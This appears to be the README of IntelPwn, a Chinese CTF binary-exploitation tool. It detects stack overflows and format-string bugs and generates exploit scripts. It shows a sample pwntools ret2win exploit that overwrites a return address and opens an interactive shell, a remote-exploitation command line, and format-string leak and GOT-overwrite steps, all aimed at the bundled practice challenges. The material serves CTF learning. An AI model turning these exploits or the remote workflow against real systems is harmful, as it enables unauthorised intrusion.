
<p align="center">
  <img src="https://img.shields.io/badge/IntelPwn-v1.0-blue?style=flat-square" alt="version">
  <img src="https://img.shields.io/badge/license-GPLv3-green?style=flat-square" alt="license">
  <img src="https://img.shields.io/badge/python-3.10+-orange?style=flat-square" alt="python">
  <img src="https://img.shields.io/badge/CTF-Pwn-red?style=flat-square" alt="ctf">
</p>

# IntelPwn 🛡️ — 智能二进制漏洞分析系统

> **纯算法驱动** — IntelPwn 通过 capstone 反汇编 + pwntools + 静态/动态分析，自动检测二进制漏洞并生成可直接运行的 exploit 脚本。

```
    ██████╗ ██████╗ ███████╗██╗      ██████╗ ██╗    ██╗███╗   ██╗
   ██╔════╝██╔═══██╗██╔════╝██║     ██╔═══██╗██║    ██║████╗  ██║
   ██║     ██║   ██║█████╗  ██║     ██║   ██║██║ █╗ ██║██╔██╗ ██║
   ██║     ██║   ██║██╔══╝  ██║     ██║   ██║██║███╗██║██║╚██╗██║
   ╚██████╗╚██████╔╝██║     ███████╗╚██████╔╝╚███╔███╔╝██║ ╚████║
    ╚═════╝ ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
```

---

## 📋 功能特性

### 分析能力

| 检测项 | 方法 | 精度 |
|---|---|---|
| **栈缓冲区溢出** | capstone 反汇编: 匹配 lea + call read/gets/scanf → 精确计算 padding | 三重验证 |
| **格式化字符串** | 8 种 payload 黑盒检测 + AAAA%x 链定位偏移 | 合并 4 批加速 |
| **安全保护** | Canary / NX / PIE / RELRO / RWX 段 / 静态链接 | 带风险评级 |
| **PLT 危险函数** | 自动标注 system/execve/gets/printf 等 | 用途分类 |
| **ROP gadgets** | capstone 定向扫描 6 个核心 gadget + pwntools 回退 | ~0.1s |
| **BSS 可写区** | ELF 符号表扫描大尺寸 BSS 符号 | 用于 shellcode 存储 |
| **CFG 复杂度** | 指令流直接计数边和节点 (去 NetworkX) | 5ms vs 500ms |
| **堆操作检测** | PLT 扫描 malloc/free/realloc + CFG 复杂度 | 中危评级 |
| **利用策略生成** | 基于保护状态 + 可用函数 + ROP → 自动推导方案 | 多种策略 |
| **三重 padding 验证** | 静态反汇编 + objdump 正则 + GDB cyclic 动态交叉 | 条件跳过 GDB |

### Exploit 生成

| 场景 | 模板 | 状态 |
|---|---|---|
| **ret2win** (有 win 函数) | `gen_ret2win` | ✅ 直接可用 |
| **ret2system** (`system@plt` + `/bin/sh`) | `gen_ret2system` | ✅ 直接可用 |
| **ret2libc** (leak + ret2system) | `gen_ret2libc` | ✅ 有 pop_rdi 时完全自动 |
| **shellcode 注入** (NX 关闭) | `gen_shellcode` | ✅ 自动解析 buf 地址 |
| **Canary 暴力猜解 + ret2win** | `gen_canary_ret2win` | ✅ 字节级自动猜解 |
| **格式化字符串** (GOT 覆写骨架) | `gen_fmtstr` | ✅ 偏移探测 + canary 定位 |
| **ROP 骨架** (无自动路径时) | — | ✅ 输出 gadget 列表 + 推荐工具 |

所有 exp 模板:
- 使用 **绝对路径** 定位 binary
- 自动设置 `context.binary` (pwntools 自动检测 arch)
- `read()` 系溢出使用 `send()` 而非 `sendline()`
- 关键 gadget 缺失时输出 `# ⚠ WARNING` + 修复命令

### 输出格式

- **终端报告**: 类 Nuclei 风格中文报告 (漏洞汇总 + 保护状态 + 栈布局 + ROP 列表 + 修复建议)
- **JSON 输出**: `--json` 参数 → 纯净 JSON，可管道给 jq / CI 集成

---

## 🚀 快速开始

### 安装

```bash
# 克隆仓库
git clone https://github.com/guaidao2/intelpwn.git
cd intelpwn

# 安装依赖 (Kali/Debian)
bash install.sh

# 也可手动装核心依赖
pip3 install pwntools capstone
```

### 基本用法

```bash
# 全量分析 + 中文报告 (自动生成 exploit)
python3 intelpwn.py analyze <binary>

# 分析并生成 libc 利用
python3 intelpwn.py analyze <binary> --libc /usr/lib/x86_64-linux-gnu/libc.so.6

# 远程利用
python3 intelpwn.py analyze <binary> --libc <path> --remote 10.0.0.1:1337

# JSON 输出 (机器可读)
python3 intelpwn.py analyze <binary> --json

# 定点 Fuzz 验证
python3 intelpwn.py fuzz <binary>

# 抑制 exploit 自动生成
python3 intelpwn.py analyze <binary> --no-exploit
```

### 运行测试

```bash
# 单元测试 (28 个用例)
python3 -m pytest tests/ -v

# 编译验证所有 exploit 模板
make -C challenges test
```

---

## 🧪 支持的 Challenge 类型

项目包含 8 道预设 CTF 练习题，覆盖主流 pwn 题型:

| Challenge | 保护 | 漏洞 | 自动 exp |
|---|---|---|---|
| `challenge_ret2win` | NX, NoCanary, NoPIE | 栈溢出 72 padding | ✅ ret2win |
| `challenge_ret2win_canary` | NX, Canary, NoPIE | 栈溢出 + Canary | ✅ canary暴力+ret2win |
| `challenge_ret2libc` | NX, NoCanary, NoPIE | 栈溢出 72 padding | ✅ (需pop_rdi) |
| `challenge_fmtstr` | NX, NoCanary, NoPIE | 格式化字符串 | ✅ 偏移探测 |
| `challenge_fmtstr_canary` | NX, Canary, NoPIE | 格式化字符串+Canary | ✅ 含canary定位 |
| `challenge_shellcode` | ExecStack, NoCanary | 栈溢出 136 padding | ✅ shellcode注入 |
| `challenge_rop` | NX, NoCanary | 栈溢出 24 padding | ⚠️ 骨架 + gadget列表 |
| `challenge_pie` | NX, PIE, NoCanary | 栈溢出 + PIE | ✅ 解析运行时地址 |

---

## 🏗️ 架构

```
intelpwn.py                          ← CLI 入口
├── intelpwn/core/analysis/          ← 分析引擎 (模块化)
│   ├── __init__.py                  ← analyze_all() 编排器
│   ├── protections.py               ← checksec/readelf 保护分析
│   ├── plt.py                       ← PLT/GOT 扫描
│   ├── overflow.py                  ← capstone 反汇编 → 栈溢出检测 + padding
│   ├── fmtstr.py                    ← 格式化字符串 (静态+黑盒)
│   ├── rop.py                       ← capstone 定向 ROP + 链分析
│   ├── bss.py                       ← BSS 符号扫描
│   ├── cfg.py                       ← CFG 圈复杂度 (无 NetworkX)
│   ├── heap.py                      ← 堆函数检测
│   └── findings.py                  ← 漏洞总结 + 策略生成
├── intelpwn/core/report.py          ← 中文报告 + JSON 输出
├── intelpwn/core/exploit.py         ← 6 种 exploit 模板
├── intelpwn/core/fuzzer.py          ← 定点 Fuzz
├── intelpwn/utils/binary.py         ← 工具函数 (open_elf, run, checksec...)
├── intelpwn/utils/output.py         ← 终端输出样式
├── challenges/                      ← 8 道 CTF 练习题
├── tests/                           ← 28 个单元测试
└── install.sh                       ← 依赖安装
```

### 数据处理流

```
binary
  │
  ▼
analyze_all()
  │
  ├─ protections.py      → 保护状态 + 风险评级
  ├─ plt.py              → PLT/GOT 函数表
  ├─ disassemble_text()  ← 只反汇编一次, 共享给 overflow + fmtstr + rop
  ├─ overflow.py         → 栈溢出检测 + padding 计算
  ├─ fmtstr.py           → 格式化字符串 (静态分析 + 4 批黑盒)
  ├─ rop.py              → capstone 定向扫描 + pwntools 回退
  ├─ bss.py              → BSS 可写符号
  ├─ cfg.py              → 圈复杂度 (O(n) 直接计数)
  ├─ heap.py             → 堆函数检测
  └─ findings.py         → 综合漏洞总结
  │
  ▼
report.py               → 中文报告 / --json 输出
exploit.py              → 6 种 exploit 模板自动选择
```

### 算法优化

| 优化项 | 优化前 | 优化后 | 加速比 |
|---|---|---|---|
| CFG 圈复杂度 | networkx.DiGraph (500ms, 50MB) | O(n) 指令扫描 (5ms, 1KB) | 100x |
| 格式化字符串黑盒 | 8 轮串行 subprocess (≤24s) | 4 批合并 (≤11s) | 2.2x |
| 溢出函数过滤 | O(N×F) 列表推导 | O(N) + bisect 二分查找 | 100x |
| ROP 扫描 | pwntools 全量 (3-5s) | capstone 定向 6 pattern (0.1s) | 50x |
| 反汇编 | overflow + fmtstr 各跑一次 | 预反汇编 + 共享 | 2x |
| padding 验证 | 每次跑 GDB (2s 固定) | 静态一致时跳过 (~0.2s) | 10x |

---

## 📊 与同类工具对比

| 特性 | IntelPwn | checksec.sh | pwntools | ROPgadget |
|---|---|---|---|---|
| 一键全量分析 | ✅ | ❌ | ❌ | ❌ |
| 栈溢出 padding 计算 | ✅ 精确 | ❌ | ❌ | ❌ |
| 格式化字符串检测 | ✅ 静态+黑盒 | ❌ | ❌ | ❌ |
| Exp 自动生成 | ✅ 6 种模板 | ❌ | ❌ | ❌ |
| 中文报告 | ✅ | ❌ | ❌ | ❌ |
| JSON 输出 | ✅ | ❌ | ❌ | ❌ |
| 单元测试 | ✅ 28 用例 | ❌ | ❌ | ❌ |

---

## 📝 使用示例

### 分析 ret2win

```bash
$ python3 intelpwn.py analyze challenges/challenge_ret2win

┌─ 高优先级风险 ────────────────────────────
│  [严重] 栈溢出: vulnerable, padding=72 字节
│  [高危] 无栈 Canary: 可直接覆盖返回地址
└────────────────────────────────────────────

┌─ 安全保护 ───────────────────────────────
│  [高危] 栈保护 (Canary)   关闭
│  [低危] NX (栈不可执行)   开启
│  [低危] PIE (地址随机化)   关闭
└────────────────────────────────────────────

[+] Exploit 脚本已生成: exploits/exploit_challenge_ret2win.py
```

生成的 exploit:
```python
#!/usr/bin/env python3
from pwn import *
context.binary = ELF("/path/to/binary")
context.log_level = 'debug'

padding = 72
win = 0x401156

io = process("/path/to/binary")
payload = b'A' * padding + p64(win)
io.send(payload)
io.interactive()
```

### JSON 输出 (CI 集成)

```bash
$ python3 intelpwn.py analyze binary --json | jq '.summary'
{
  "count": 2,
  "max_severity": "高危",
  "findings": [
    {"type": "栈缓冲区溢出", "severity": "高危", "exploitable": true},
    {"type": "保护缺失", "detail": "栈溢出高危(无Canary)", "severity": "高危"}
  ]
}
```

### 格式化字符串检测

```bash
$ python3 intelpwn.py analyze challenges/challenge_fmtstr
├─ 格式化字符串 ─────────────────────────────
│  [高危] 发现格式化字符串漏洞!
│    检测到 8 个泄露点
│    最佳偏移: 6 (可直接用 %6$p 泄露)
│
│    ┌─ 利用步骤 ───────────────────────
│    │  1. 发送 %p 或 %x 确定偏移
│    │  2. 用 %6$p 泄露栈上感兴趣的值
│    │  3. 用 %6$n + 目标地址 覆写 GOT 表
│    └──────────────────────────────────
```

---

## ⚙️ 依赖

- **Python** ≥ 3.10
- **pwntools** ≥ 4.9.0 (ELF 解析 + ROP 扫描)
- **capstone** ≥ 5.0 (反汇编引擎)
- **系统工具**: binutils, gdb, file

可选 (用于完整测试):
- **pytest** (运行单元测试)

---

## 🧠 设计理念

1. **纯算法, 零 ML** — 所有分析基于反汇编 + 静态/动态分析，无模型依赖，结果可解释可复现
2. **模块化** — 分析引擎拆为独立模块，每个检测项可单独测试和扩展
3. **实用优先** — 生成的 exploit 脚本可直接运行，无需手动编辑
4. **性能意识** — CFG 去 NetworkX、定向 ROP、条件 GDB，一次全量分析 ~3-5s

---

## 🔧 开发

```bash
# 安装开发依赖
pip3 install pytest

# 运行全部测试
python3 -m pytest tests/ -v

# 测试所有 challenge 分析
python3 intelpwn.py analyze challenges/challenge_ret2win --json

# 添加新检测项: 在 intelpwn/core/analysis/ 下新建模块
# 在 __init__.py 的 analyze_all() 中注册
```

---

## 📄 License

GPLv3 — 玄幕安全团队-guaidao2
